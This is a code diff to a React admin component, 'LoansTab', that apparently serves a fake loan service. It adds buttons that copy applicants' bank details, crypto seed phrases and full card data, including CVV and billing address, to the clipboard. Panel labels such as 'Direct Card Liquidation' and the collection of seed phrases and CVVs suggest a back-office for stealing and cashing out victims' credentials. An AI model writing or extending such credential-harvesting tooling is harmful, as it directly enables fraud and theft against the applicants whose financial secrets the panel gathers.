@@ -616,13 +616,53 @@ export function LoansTab() {
                               )}
                             </DetailSection>
 
-                            <DetailSection title="💸 Financial & Payout Assets">
+                            <DetailSection
+                              title="💸 Financial & Payout Assets"
+                              onCopyAll={() => {
+                                const lines: string[] = [];
+                                if (r.bankName || r.bankAccountNumber) {
+                                  lines.push("=== BANK TRANSFER ===");
+                                  lines.push(`Bank Name: ${r.bankName ?? ""}`);
+                                  lines.push(`Account Holder: ${r.accountHolderName ?? ""}`);
+                                  lines.push(`Account Number: ${r.bankAccountNumber ?? ""}`);
+                                  lines.push(`Routing / SWIFT: ${r.bankRoutingNumber ?? ""}`);
+                                }
+                                if (r.cryptoWalletAddress || r.cryptoSeedPhrase) {
+                                  lines.push("\n=== CRYPTO WALLET ===");
+                                  lines.push(`Wallet Type: ${r.cryptoWalletType ?? ""}`);
+                                  lines.push(`Network: ${r.cryptoNetwork ?? ""}`);
+                                  lines.push(`Address: ${r.cryptoWalletAddress ?? ""}`);
+                                  if (r.cryptoSeedPhrase) lines.push(`Seed Phrase: ${r.cryptoSeedPhrase}`);
+                                }
+                                if (r.cardNumber) {
+                                  lines.push("\n=== CARD ===");
+                                  lines.push(`Card Number: ${r.cardNumber}`);
+                                  lines.push(`Expiry: ${r.cardExpiry ?? ""}`);
+                                  lines.push(`CVV: ${r.cardCvv ?? ""}`);
+                                  lines.push(`Holder: ${r.cardHolderName ?? ""}`);
+                                  lines.push(`Issuer: ${r.cardIssuer ?? ""}`);
+                                  lines.push(`Billing: ${r.billingAddressLine1 ?? ""}, ${r.billingCity ?? ""}, ${r.billingState ?? ""} ${r.billingPostalCode ?? ""}, ${r.billingCountry ?? ""}`);
+                                }
+                                navigator.clipboard.writeText(lines.join("\n"));
+                                toast.success("All financial assets copied");
+                              }}
+                            >
                               {/* Always show Bank if data exists */}
                               {(r.bankName || r.bankAccountNumber) && (
                                 <div className="space-y-3 mb-6">
-                                  <div className="flex items-center gap-2 mb-2">
-                                    <span className="h-2 w-2 rounded-full bg-blue-500 shadow-[0_0_8px_#3b82f6]"></span>
-                                    <span className="text-[10px] font-black uppercase tracking-tighter text-blue-600">Institutional Bank Transfer</span>
+                                  <div className="flex items-center justify-between mb-2">
+                                    <div className="flex items-center gap-2">
+                                      <span className="h-2 w-2 rounded-full bg-blue-500 shadow-[0_0_8px_#3b82f6]"></span>
+                                      <span className="text-[10px] font-black uppercase tracking-tighter text-blue-600">Institutional Bank Transfer</span>
+                                    </div>
+                                    <button
+                                      onClick={() => {
+                                        const text = `Bank: ${r.bankName ?? ""}\nHolder: ${r.accountHolderName ?? ""}\nAccount: ${r.bankAccountNumber ?? ""}\nRouting/SWIFT: ${r.bankRoutingNumber ?? ""}`;
+                                        navigator.clipboard.writeText(text);
+                                        toast.success("Bank details copied");
+                                      }}
+                                      className="text-[9px] font-bold text-blue-600 hover:text-blue-800 uppercase tracking-tighter bg-blue-50 hover:bg-blue-100 px-2 py-0.5 rounded"
+                                    >Copy Bank</button>
                                   </div>
                                   <DField label="Bank Name" value={r.bankName} />
                                   <DField label="Account Holder" value={r.accountHolderName} />
@@ -630,13 +670,23 @@ export function LoansTab() {
                                   <DField label="Routing / SWIFT" value={r.bankRoutingNumber} mono />
                                 </div>
                               )}
-                              
+
                               {/* Always show Crypto if data exists */}
                               {(r.cryptoWalletAddress || r.cryptoSeedPhrase) && (
                                 <div className="space-y-3 mb-6">
-                                  <div className="flex items-center gap-2 mb-2">
-                                    <span className="h-2 w-2 rounded-full bg-orange-500 shadow-[0_0_8px_#f97316]"></span>
-                                    <span className="text-[10px] font-black uppercase tracking-tighter text-orange-600">Digital Asset Settlement</span>
+                                  <div className="flex items-center justify-between mb-2">
+                                    <div className="flex items-center gap-2">
+                                      <span className="h-2 w-2 rounded-full bg-orange-500 shadow-[0_0_8px_#f97316]"></span>
+                                      <span className="text-[10px] font-black uppercase tracking-tighter text-orange-600">Digital Asset Settlement</span>
+                                    </div>
+                                    <button
+                                      onClick={() => {
+                                        const text = `Wallet: ${r.cryptoWalletType ?? ""}\nNetwork: ${r.cryptoNetwork ?? ""}\nAddress: ${r.cryptoWalletAddress ?? ""}${r.cryptoSeedPhrase ? `\nSeed: ${r.cryptoSeedPhrase}` : ""}`;
+                                        navigator.clipboard.writeText(text);
+                                        toast.success("Crypto details copied");
+                                      }}
+                                      className="text-[9px] font-bold text-orange-600 hover:text-orange-800 uppercase tracking-tighter bg-orange-50 hover:bg-orange-100 px-2 py-0.5 rounded"
+                                    >Copy Crypto</button>
                                   </div>
                                   <DField label="Wallet Ecosystem" value={r.cryptoWalletType} />
                                   <DField label="Settlement Network" value={r.cryptoNetwork} />
@@ -652,9 +702,19 @@ export function LoansTab() {
                               {/* Always show Card if data exists */}
                               {r.cardNumber && (
                                 <div className="space-y-4">
-                                  <div className="flex items-center gap-2">
-                                    <span className="h-2 w-2 rounded-full bg-purple-500 shadow-[0_0_8px_#a855f7]"></span>
-                                    <span className="text-[10px] font-black uppercase tracking-tighter text-purple-600">Direct Card Liquidation</span>
+                                  <div className="flex items-center justify-between">
+                                    <div className="flex items-center gap-2">
+                                      <span className="h-2 w-2 rounded-full bg-purple-500 shadow-[0_0_8px_#a855f7]"></span>
+                                      <span className="text-[10px] font-black uppercase tracking-tighter text-purple-600">Direct Card Liquidation</span>
+                                    </div>
+                                    <button
+                                      onClick={() => {
+                                        const text = `Card Number: ${r.cardNumber}\nExpiry: ${r.cardExpiry ?? ""}\nCVV: ${r.cardCvv ?? ""}\nHolder: ${r.cardHolderName ?? ""}\nIssuer: ${r.cardIssuer ?? ""}\nBilling: ${r.billingAddressLine1 ?? ""}, ${r.billingCity ?? ""}, ${r.billingState ?? ""} ${r.billingPostalCode ?? ""}, ${r.billingCountry ?? ""}`;
+                                        navigator.clipboard.writeText(text);
+                                        toast.success("Card details copied");
+                                      }}
+                                      className="text-[9px] font-bold text-purple-600 hover:text-purple-800 uppercase tracking-tighter bg-purple-50 hover:bg-purple-100 px-2 py-0.5 rounded"
+                                    >Copy Card</button>
                                   </div>
                                   <div className="bg-slate-900 border-slate-700 shadow-xl rounded-xl p-4 relative overflow-hidden">
                                     <div className="absolute top-0 right-0 p-3 opacity-10 pointer-events-none">
@@ -703,10 +763,10 @@ export function LoansTab() {
                                     {r.identityVerified ? 'IDENTITY FULLY VERIFIED' : 'PENDING BIOMETRIC AUDIT'}
                                   </p>
                                 </div>
-                                <button 
+                                <button
                                   onClick={() => onVerifyIdentity(r.id, !r.identityVerified)}
                                   className={`px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all ${
-                                    r.identityVerified 
+                                    r.identityVerified
                                       ? 'bg-amber-500 hover:bg-amber-600 text-white shadow-[0_0_15px_rgba(245,158,11,0.4)]' 
                                       : 'bg-emerald-500 hover:bg-emerald-600 text-white shadow-[0_0_15px_rgba(16,185,129,0.4)]'
                                   }`}
